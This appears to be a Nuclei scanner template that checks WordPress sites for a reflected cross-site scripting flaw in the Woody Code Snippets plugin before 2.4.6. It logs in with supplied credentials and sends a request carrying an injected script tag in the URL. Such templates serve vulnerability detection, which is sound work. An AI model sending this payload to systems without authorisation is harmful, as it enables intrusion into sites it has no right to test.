id: wp-insert-php-xss
info:
  author: Akincibor,DhiyaneshDk
  description: The plugin does not escape a generated URLs before outputting them
    back in an attribute, leading to Reflected Cross-Site Scripting
  metadata:
    verified: true
  name: Woody Code Snippets < 2.4.6 - Reflected Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/6d6761b7-0c17-4428-8748-2179732030a3
  severity: medium
  tags: wp-plugin,xss,wp,wordpress,authenticated,woody
requests:
- cookie-reuse: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - import-wbcr_insert_php&a\"><script>alert(1)</script>"
    - Woody Code Snippets Import
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(1)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
